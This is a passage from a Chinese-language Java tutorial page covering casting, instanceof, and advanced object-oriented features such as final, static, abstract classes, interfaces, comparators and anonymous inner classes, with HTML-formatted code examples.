class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="comment">//方法代码省略...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="comment">//方法代码省略...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChineseWoman</span> <span class="keyword">extends</span> <span class="title">Woman</span></span>&#123;</span><br><span class="line"><span class="comment">//方法代码省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="comment">//向上转型</span></span><br><span class="line">Person p1 = <span class="keyword">new</span> Woman();</span><br><span class="line"><span class="comment">//向下转型</span></span><br><span class="line">Woman m = (Woman)p1; </span><br><span class="line"><span class="comment">//p1变量中实际存储的对象就是Woman类型，和强转的Woman类型一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//向上转型</span></span><br><span class="line">Person p2 = <span class="keyword">new</span> ChineseWoman();</span><br><span class="line"><span class="comment">//向下转型</span></span><br><span class="line">Woman w2 = (Woman) p2; </span><br><span class="line"><span class="comment">//p2变量中实际存储的对象是ChineseWoman类型，强制的类型是Woman，ChineseWoman&lt;Woman类型     </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6、instanceof</p><p>表达式语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象/变量  <span class="keyword">instanceof</span>  类型</span><br></pre></td></tr></table></figure><p>运算结果：true 或 false</p><p>作用：</p><p>用来判断这个对象是否属于这个类型，或者说，是否是这个类型的对象或这个类型子类的对象</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="comment">//方法代码省略...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="comment">//方法代码省略...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChineseWoman</span> <span class="keyword">extends</span> <span class="title">Woman</span></span>&#123;</span><br><span class="line"><span class="comment">//方法代码省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        Woman w = <span class="keyword">new</span> Woman();</span><br><span class="line">        ChineseWoman c = <span class="keyword">new</span> ChineseWoman();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(p <span class="keyword">instanceof</span> Woman)&#123;<span class="comment">//false</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(w <span class="keyword">instanceof</span> Woman)&#123;<span class="comment">//true</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c <span class="keyword">instanceof</span> Woman)&#123;<span class="comment">//true</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第七章-面向对象的高级特性"><a href="#第七章-面向对象的高级特性" class="headerlink" title="第七章 面向对象的高级特性"></a>第七章 面向对象的高级特性</h1><p>修饰符的学习围绕三个问题：</p><p>（1）单词的意思</p><p>（2）可以修饰什么？</p><p>（3）用它修饰后有什么不同？</p><h2 id="7-1-关键字：final"><a href="#7-1-关键字：final" class="headerlink" title="7.1 关键字：final"></a>7.1 关键字：final</h2><p>final：最终的</p><p>用法：</p><p>（1）修饰类（包括外部类、内部类类）</p><p>表示这个类不能被继承，没有子类</p><p>（2）修饰方法</p><p>表示这个方法不能被重写</p><p>（3）修饰变量（成员变量（类变量、实例变量），局部变量）</p><p>表示这个变量的值不能被修改</p><p>注意：如果某个成员变量用final修饰后，也得手动赋值，而且这个值一旦赋完，就不能修改了，即没有set方法</p><h2 id="7-2-关键字：native"><a href="#7-2-关键字：native" class="headerlink" title="7.2 关键字：native"></a>7.2 关键字：native</h2><p>native：本地的，原生的<br>用法：</p><p>​    只能修饰方法</p><p>​    表示这个方法的方法体代码不是用Java语言实现的。</p><p>​    但是对于Java程序员来说，可以当做Java的方法一样去正常调用它，或者子类重写它。</p><p>JVM内存的管理：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1555119319865.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>方法区：类的信息、常量、静态变量、动态编译生成的字节码信息</p><p>虚拟机栈：Java语言实现的方法的局部变量</p><p>本地方法栈：非Java语言实现的方法的局部变量，即native方法执行时的内存区域</p><p>堆：new出来的对象</p><p>程序计数器：记录每一个线程目前执行到哪一句指令</p><h2 id="7-3-关键字：static"><a href="#7-3-关键字：static" class="headerlink" title="7.3 关键字：static"></a>7.3 关键字：static</h2><p>static：静态的</p><p>用法：</p><p>1、成员方法：我们一般称为静态方法或类方法</p><p>（1）不能被重写</p><p>（2）被使用</p><p>本类中：其他方法中可以直接使用它</p><p>其他类中：可以使用“类名.方法”进行调用，也可以使用”对象名.方法”，推荐使用“类名.方法”</p><p>（3）在静态方法中，我们不能出现：this，super，非静态的成员</p><p>2、成员变量：我们一般称为静态变量或类变量</p><p>（1）静态变量的值是该类所有对象共享的</p><p>（2）静态变量存储在方法区</p><p>（3）静态变量对应的get/set也是静态的</p><p>（4）静态变量与局部变量同名时，就可以使用“类名.静态变量”进行区分</p><p>3、内部类：后面讲</p><p>4、代码块：静态代码块</p><p>5、静态导入（JDK1.5引入）</p><p>没有静态导入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_VALUE = <span class="number">1000</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(Utils.MAX_VALUE);</span><br><span class="line">        Utils.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用静态导入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_VALUE = <span class="number">1000</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.atguigu.utils.Utils.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(MAX_VALUE);</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-4-静态代码块"><a href="#7-4-静态代码块" class="headerlink" title="7.4 静态代码块"></a>7.4 静态代码块</h2><p>1、语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        静态代码块;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、作用：</p><p>协助完成类初始化，可以为类变量赋值。</p><p>3、类初始化<clinit>()</clinit></p><p>类的初始化有：</p><p>①静态变量的显式赋值代码</p><p>②静态代码块中代码</p><p>其中①和②按顺序执行</p><p>注意：类初始化方法，一个类只有一个</p><p>4、类的初始化的执行特点：</p><p>（1）每一个类的<clinit>()只执行一次</clinit></p><p>（2）如果一个子类在初始化时，发现父类也没有初始化，会先初始化父类</p><p>（3）如果既要类初始化又要实例化初始化，那么一定是先完成类初始化的</p><h2 id="7-5-变量的分类与区别"><a href="#7-5-变量的分类与区别" class="headerlink" title="7.5  变量的分类与区别"></a>7.5  变量的分类与区别</h2><p>1、变量按照数据类型分：</p><p>（1）基本数据类型的变量，里面存储数据值</p><p>（2）引用数据类型的变量，里面存储对象的地址值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;<span class="comment">//a中存储的是数据值</span></span><br><span class="line"></span><br><span class="line">Student stu = <span class="keyword">new</span> Student();<span class="comment">//stu存储的是对象的地址值</span></span><br><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];<span class="comment">//arr存储的是数组对象的地址值</span></span><br><span class="line">String str = <span class="string">"hello"</span>;<span class="comment">//str存储的是"hello"对象的地址值</span></span><br></pre></td></tr></table></figure><p>2、变量按照声明的位置不同：</p><p>（1）成员变量</p><p>（2）局部变量</p><p>3、成员变量与局部变量的区别</p><p>（1）声明的位置不同</p><p>成员变量：类中方法外</p><p>局部变量：（1）方法的()中，即形参（2）方法体的{}的局部变量（3）代码块{}中</p><p>（2）存储的位置不同</p><p>成员变量：</p><p>​    如果是静态变量（类变量），在方法区中</p><p>​    如果是非静态的变量（实例变量），在堆中</p><p> 局部变量：栈</p><p>（3）修饰符不同</p><p>成员变量：4种权限修饰符、static、final。。。。</p><p>局部变量：只有final</p><p>（4）生命周期</p><p>成员变量：</p><p>​    如果是静态变量（类变量），和类相同</p><p>​    如果是非静态的变量（实例变量），和所属的对象相同，每一个对象是独立</p><p>局部变量：每次执行都是新的</p><p>（5）作用域</p><p>成员变量：</p><p>​    如果是静态变量（类变量），在本类中随便用，在其他类中使用“类名.静态变量”</p><p>​    如果是非静态的变量（实例变量），在本类中只能在非静态成员中使用，在其他类中使用“对象名.非静态的变量”</p><p>局部变量：有作用域</p><h2 id="7-7-根父类"><a href="#7-7-根父类" class="headerlink" title="7.7  根父类"></a>7.7  根父类</h2><p>1、java.lang.Object类是类层次结构的根父类。包括数组对象。</p><p>（1）Object类中声明的所有的方法都会被继承到子类中，那么即所有的对象，都拥有Object类中的方法</p><p>（2）每一个对象的创建，最终都会调用到Object实例初始化方法<init>()</init></p><p>（3）Object类型变量、形参、数组，可以存储任意类型的对象</p><p>2、Object类的常用方法</p><p>（1）public String toString()：</p><p>①默认情况下，返回的是“对象的运行时类型 @ 对象的hashCode值的十六进制形式”</p><p>②通常是建议重写，如果在eclipse中，可以用Alt +Shift + S–&gt;Generate toString()</p><p>③如果我们直接System.out.println(对象)，默认会自动调用这个对象的toString()</p><p>（2）public final Class&lt;?&gt; getClass()：获取对象的运行时类型</p><p>（3）protected void finalize()：当对象被GC确定为要被回收的垃圾，在回收之前由GC帮你调用这个方法。而且这个方法只会被调用一次。子类可以选择重写。</p><p>（4）public int hashCode()：返回每个对象的hash值。</p><p>规定：①如果两个对象的hash值是不同的，那么这两个对象一定不相等；</p><p>​    ②如果两个对象的hash值是相同的，那么这两个对象不一定相等。</p><p>主要用于后面当对象存储到哈希表等容中时，为了提高性能用的。</p><p>（5）public boolean equals(Object obj)：用于判断当前对象this与指定对象obj是否“相等”</p><p>①默认情况下，equals方法的实现等价于与“==”，比较的是对象的地址值</p><p>②我们可以选择重写，重写有些要求：</p><p>A：如果重写equals，那么一定要一起重写hashCode()方法，因为规定：</p><p>​    a：如果两个对象调用equals返回true，那么要求这两个对象的hashCode值一定是相等的；</p><p>​    b：如果两个对象的hashCode值不同的，那么要求这个两个对象调用equals方法一定是false；</p><p>​    c：如果两个对象的hashCode值相同的，那么这个两个对象调用equals可能是true，也可能是false</p><p>B：如果重写equals，那么一定要遵循如下几个原则：</p><p>​    a：自反性：x.equals(x)返回true</p><p>​    b：传递性：x.equals(y)为true, y.equals(z)为true，然后x.equals(z)也应该为true</p><p>​    c：一致性：只要参与equals比较的属性值没有修改，那么无论何时调用结果应该一致</p><p>​    d：对称性：x.equals(y)与y.equals(x)结果应该一样</p><p>​    e：非空对象与null的equals一定是false</p><h2 id="7-8-关键字：abstract"><a href="#7-8-关键字：abstract" class="headerlink" title="7.8 关键字：abstract"></a>7.8 关键字：abstract</h2><p>1、什么时候会用到抽象方法和抽象类？</p><p>当声明父类的时候，在父类中某些方法的方法体的实现不能确定，只能由子类决定。但是父类中又要体现子类的共同的特征，即它要包含这个方法，为了统一管理各种子类的对象，即为了多态的应用。</p><p>那么此时，就可以选择把这样的方法声明为抽象方法。如果一个类包含了抽象方法，那么这个类就必须是个抽象类。</p><p>2、抽象类的语法格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">【权限修饰符】 <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">【权限修饰符】 <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> 类名 <span class="keyword">extends</span> 父类</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、抽象方法的语法格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">【其他修饰符】 <span class="keyword">abstract</span> 返回值类型  方法名(【形参列表】);</span><br></pre></td></tr></table></figure><p>抽象方法没有方法体</p><p>4、抽象类的特点</p><p>（1）抽象类不能直接实例化，即不能直接new对象</p><p>（2）抽象类就是用来被继承的，那么子类继承了抽象类后，必须重写所有的抽象方法，否则这个子类也得是抽象类</p><p>（3）抽象类也有构造器，这个构造的作用不是创建抽象类自己的对象用的，给子类在实例化过程中调用；</p><p>（4）抽象类也可以没有抽象方法，那么目的是不让你创建对象，让你创建它子类的对象</p><p>（5）抽象类的变量与它子类的对象也构成多态引用</p><p>5、不能和abstract一起使用的修饰符？</p><p>（1）final：和final不能一起修饰方法和类</p><p>（2）static：和static不能一起修饰方法</p><p>（3）native：和native不能一起修饰方法</p><p>（4）private：和private不能一起修饰方法</p><h2 id="7-9-接口"><a href="#7-9-接口" class="headerlink" title="7.9 接口"></a>7.9 接口</h2><p>1、接口的概念</p><p>接口是一种标准。注意关注行为标准（即方法）。</p><p>面向对象的开发原则中有一条：面向接口编程。</p><p>2、接口的声明格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">interface</span> 接口名</span>&#123;</span><br><span class="line">    接口的成员列表;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、类实现接口的格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 实现类  <span class="keyword">implements</span> 父接口们</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 实现类 <span class="keyword">extends</span> 父类 <span class="keyword">implements</span> 父接口们</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、接口继承接口的格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">interface</span> 接口名 <span class="keyword">extends</span> 父接口们</span>&#123;</span><br><span class="line">    接口的成员列表;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、接口的特点</p><p>（1）接口不能直接实例化，即不能直接new对象</p><p>（2）只能创建接的实现类对象，那么接口与它的实现类对象之间可以构成多态引用。</p><p>（3）实现类在实现接口时，必须重写所有抽象的方法，否则这个实现类也得是抽象类。</p><p>（4）Java规定类与类之间，只能是单继承，但是Java的类与接口之间是多实现的关系，即一个类可以同时实现多个接口</p><p>（5）Java还支持接口与接口之间的多继承。</p><p>6、接口的成员</p><p>JDK1.8之前：</p><p>（1）全局的静态的常量：public static final，这些修饰符可以省略</p><p>（2）公共的抽象方法：public abstract，这些修饰符也可以省略</p><p>JDK1.8之后：</p><p>（3）公共的静态的方法：public static ,这个就不能省略了</p><p>（4）公共的默认的方法：public default，这个就不能省略了</p><p>7、默认方法冲突问题</p><p>（1） 当一个实现类同时实现了两个或多个接口，这个多个接口的默认方法的签名相同。</p><p>解决方案：</p><p>方案一：选择保留其中一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接口名.<span class="keyword">super</span>.方法名(【实参列表】);</span><br></pre></td></tr></table></figure><p>方案二：完全重写</p><p>（2）当一个实现类同时继承父类，又实现接口，父类中有一个方法与接口的默认方法签名相同</p><p>解决方案：</p><p>方案一：默认方案，保留父类的</p><p>方案二：选择保留接口的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接口名.<span class="keyword">super</span>.方法名(【实参列表】);</span><br></pre></td></tr></table></figure><p>方案三：完全重写</p><p>8、示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Flyable</span></span>&#123;</span><br><span class="line"><span class="keyword">long</span> MAX_SPEED = <span class="number">7900000</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bird</span> <span class="keyword">implements</span> <span class="title">Flyable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>9、常用的接口</p><p>（1）java.lang.Comparable接口：自然排序</p><p>​    抽象方法：int compareTo(Object obj)</p><p>（2）java.util.Comparator接口：定制排序</p><p>​    抽象方法：int compare(Object obj1 ,Object obj2)</p><p>（3）示例代码</p><p>如果员工类型，默认顺序，自然顺序是按照编号升序排列，那么就实现Comparable接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">Comparable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//省略了构造器，get/set,toString</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id - ((Employee)obj).id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果在后面又发现有新的需求，想要按照薪资排序，那么只能选择用定制排序，实现Comparator接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalaryComparator</span> <span class="keyword">implements</span> <span class="title">Comparator</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object o1, Object o2)</span></span>&#123;</span><br><span class="line">        Employee e1 = (Employee)o1;</span><br><span class="line">        Employee e2 = (Employee)o2;</span><br><span class="line">        <span class="keyword">if</span>(e1.getSalary() &gt; e2.getSalary())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(e1.getSalary() &lt; e2.getSalary())&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-10-内部类"><a href="#7-10-内部类" class="headerlink" title="7.10 内部类"></a>7.10 内部类</h2><p>1、内部类的概念</p><p>声明在另外一个类里面的类就是内部类。</p><p>2、内部类的4种形式</p><p>（1）静态内部类</p><p>（2）非静态成员内部类</p><p>（3）有名字的局部内部类</p><p>（4）匿名内部类</p><h3 id="7-10-1-匿名内部类"><a href="#7-10-1-匿名内部类" class="headerlink" title="7.10.1 匿名内部类"></a>7.10.1 匿名内部类</h3><p>1、语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在匿名子类中调用父类的无参构造</span></span><br><span class="line"><span class="keyword">new</span> 父类()&#123;</span><br><span class="line">    内部类的成员列表</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在匿名子类中调用父类的有参构造</span></span><br><span class="line"><span class="keyword">new</span> 父类(实参列表)&#123;</span><br><span class="line">    内部类的成员列表</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口没有构造器，那么这里表示匿名子类调用自己的无参构造，调用默认父类Object的无参构造</span></span><br><span class="line"><span class="keyword">new</span> 父接口名()&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、匿名内部类、匿名对象的区别？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="keyword">new</span> Student(<span class="string">"张三"</span>));<span class="comment">//匿名对象</span></span><br><span class="line"></span><br><span class="line">Student stu = <span class="keyword">new</span> Student(<span class="string">"张三"</span>);<span class="comment">//这个对象有名字，stu</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//既有匿名内部类，又是一个匿名的对象</span></span><br><span class="line"><span class="keyword">new</span> Object()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;.test();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个匿名内部类的对象，使用obj这个名字引用它，既对象有名字，但是这个Object的子类没有名字</span></span><br><span class="line">Object obj = <span class="keyword">new</span> Object()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>3、使用的形式</p><p>（1）示例代码：继承式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span 